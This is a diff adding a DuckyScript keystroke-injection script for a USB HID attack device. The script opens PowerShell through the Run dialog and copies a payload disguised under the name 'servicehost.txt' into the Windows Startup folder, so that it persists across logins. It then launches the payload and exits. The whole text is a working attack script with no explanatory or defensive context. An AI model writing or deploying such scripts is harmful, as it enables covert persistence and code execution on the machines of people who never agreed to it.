@@ -1,0 +1,18 @@
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 500
+STRING copy
+SPACE
+CONTROL v
+BACKSPACE
+STRING payloads\servicehost.txt 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+ENTER
+DELAY 200
+STRING start 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\servicehost.txt'
+ENTER
+DELAY 5000
+STRING exit
+ENTER
+DELAY 200
